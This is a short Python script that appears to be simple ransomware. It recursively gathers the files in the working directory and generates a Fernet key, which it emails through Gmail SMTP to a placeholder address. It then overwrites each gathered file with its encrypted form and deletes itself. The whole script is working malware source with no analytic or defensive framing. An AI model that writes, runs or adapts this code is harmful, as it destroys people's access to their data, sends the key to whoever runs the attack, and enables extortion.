from cryptography.fernet import Fernet
import smtplib
from email.mime.text import MIMEText
import os

# get files other than py file aka this file
def list_files(path, binary):
    files = []
    for item in os.listdir(path):
        full_path = os.path.join(path, item)
        if os.path.isdir(full_path):
            files.extend(list_files(full_path, binary))  # Recursively list files in subdirectories
        else:
            if not item.endswith(".py") and not item.endswith(".sh") and not item.endswith(".JPG") and os.path.splitext(item)[1].lower() not in binary:
                files.append(full_path)
    return files

binary = {".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".docx"}
path = os.getcwd()
files = list_files(path, binary)

print(files)

key = Fernet.generate_key()

# send email to not lose key
subject = "Email Subject"
body = str(key)
sender = "example@gmail.com"
recipients = ["example@gmail.com"]
password = "1234 5678 9101 1121"

def send_email(subject, body, sender, recipients, password):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender
    msg['To'] = ', '.join(recipients)
    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
       smtp_server.login(sender, password)
       smtp_server.sendmail(sender, recipients, msg.as_string())
    print("Message sent!")

send_email(subject, body, sender, recipients, password)

fernet = Fernet(key)

for file in files:
    with open(file, 'rb') as f:
        plaint = f.read()
    cipher = fernet.encrypt(plaint)
    with open(file, 'wb') as ef:
        ef.write(cipher)

os.remove(__file__)
